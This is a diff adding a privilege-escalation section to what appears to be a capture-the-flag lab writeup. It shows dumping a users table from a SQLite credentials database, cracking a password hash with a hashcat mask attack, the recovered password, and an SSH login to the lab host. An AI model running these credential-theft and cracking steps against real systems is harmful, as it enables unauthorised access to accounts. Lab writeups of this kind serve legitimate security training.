@@ -57,7 +57,22 @@ ctrl + z
 
 ## Privilege Escalation
 
+    sqlite3 pupilpath_credentials.db
+    .databases
+    .tables
+    select * from users;
 
+### hashcat
+
+`hashcat -m 1400 -a 3 file_name> susan_nasus_?d?d?d?d?d?d?d?d?d`
+
+### SSH
+
+`ssh susan@10.10.11.253`
+
+password: `susan_nasus_413759210`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/dac15776-dae7-4913-b3c3-2f148c367fd1)
 
 
 
